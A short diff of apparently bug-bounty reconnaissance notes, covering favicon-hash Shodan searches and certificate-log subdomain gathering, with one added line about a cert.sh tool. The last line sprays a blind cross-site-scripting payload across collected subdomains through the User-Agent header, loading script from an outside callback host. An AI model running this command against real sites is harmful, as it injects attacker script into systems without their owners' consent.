@@ -6,6 +6,7 @@ put favicon.ico at the end of domain as follows https://target.com/favicon.ico t
 https://github.com/N0LL101/favHash ==> to extract the hash of favicon then use the hash in shodan as follows 
 http.favicon.hash:<hash>  ==> that is gonna collect all subdomains and information exposure 
 
+use cert.sh ==> https://github.com/Micro0x00/CRTER  ==> to collect all subdomains 
  
  
 cat subdomain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>" --screenshot
